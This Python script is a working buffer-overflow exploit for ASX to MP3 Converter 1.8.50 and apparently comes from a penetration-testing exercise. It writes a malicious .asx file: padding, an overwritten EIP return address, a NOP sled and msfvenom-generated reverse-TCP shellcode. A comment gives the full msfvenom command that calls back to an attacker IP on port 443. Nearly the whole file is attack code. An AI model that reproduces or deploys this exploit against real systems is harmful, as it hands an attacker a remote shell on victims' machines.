'''
Author: Kunal Varudkar
ASX to MP3 Converter version 1.8.50
'''

filename = "exploit.asx"

buffer = "A" * 238
EIP = "\x9D\x78\x03\x10"
#EIP = "B" * 4
FFFF = "\xFF\xFF\xFF\xFF"
nops = "\x90" * 10
#Bad Chars in ASX to MP3 Converter - 0x00, 0x09, 0x0a, 0x1a
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.126 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x09\x0a\x1a"
shellcode = ("\xd9\xe8\xd9\x74\x24\xf4\xb8\xd2\xa3\xdd\xaa\x5f\x31\xc9\xb1"
"\x52\x31\x47\x17\x83\xc7\x04\x03\x95\xb0\x3f\x5f\xe5\x5f\x3d"
"\xa0\x15\xa0\x22\x28\xf0\x91\x62\x4e\x71\x81\x52\x04\xd7\x2e"
"\x18\x48\xc3\xa5\x6c\x45\xe4\x0e\xda\xb3\xcb\x8f\x77\x87\x4a"
"\x0c\x8a\xd4\xac\x2d\x45\x29\xad\x6a\xb8\xc0\xff\x23\xb6\x77"
"\xef\x40\x82\x4b\x84\x1b\x02\xcc\x79\xeb\x25\xfd\x2c\x67\x7c"
"\xdd\xcf\xa4\xf4\x54\xd7\xa9\x31\x2e\x6c\x19\xcd\xb1\xa4\x53"
"\x2e\x1d\x89\x5b\xdd\x5f\xce\x5c\x3e\x2a\x26\x9f\xc3\x2d\xfd"
"\xdd\x1f\xbb\xe5\x46\xeb\x1b\xc1\x77\x38\xfd\x82\x74\xf5\x89"
"\xcc\x98\x08\x5d\x67\xa4\x81\x60\xa7\x2c\xd1\x46\x63\x74\x81"
"\xe7\x32\xd0\x64\x17\x24\xbb\xd9\xbd\x2f\x56\x0d\xcc\x72\x3f"
"\xe2\xfd\x8c\xbf\x6c\x75\xff\x8d\x33\x2d\x97\xbd\xbc\xeb\x60"
"\xc1\x96\x4c\xfe\x3c\x19\xad\xd7\xfa\x4d\xfd\x4f\x2a\xee\x96"
"\x8f\xd3\x3b\x38\xdf\x7b\x94\xf9\x8f\x3b\x44\x92\xc5\xb3\xbb"
"\x82\xe6\x19\xd4\x29\x1d\xca\x1b\x05\x6a\x74\xf4\x54\x94\x89"
"\xbf\xd0\x72\xe3\xaf\xb4\x2d\x9c\x56\x9d\xa5\x3d\x96\x0b\xc0"
"\x7e\x1c\xb8\x35\x30\xd5\xb5\x25\xa5\x15\x80\x17\x60\x29\x3e"
"\x3f\xee\xb8\xa5\xbf\x79\xa1\x71\xe8\x2e\x17\x88\x7c\xc3\x0e"
"\x22\x62\x1e\xd6\x0d\x26\xc5\x2b\x93\xa7\x88\x10\xb7\xb7\x54"
"\x98\xf3\xe3\x08\xcf\xad\x5d\xef\xb9\x1f\x37\xb9\x16\xf6\xdf"
"\x3c\x55\xc9\x99\x40\xb0\xbf\x45\xf0\x6d\x86\x7a\x3d\xfa\x0e"
"\x03\x23\x9a\xf1\xde\xe7\xaa\xbb\x42\x41\x23\x62\x17\xd3\x2e"
"\x95\xc2\x10\x57\x16\xe6\xe8\xac\x06\x83\xed\xe9\x80\x78\x9c"
"\x62\x65\x7e\x33\x82\xac")
exploit = buffer + EIP + FFFF + nops + shellcode

f = open(filename,'w')
f.write(exploit)
f.close()
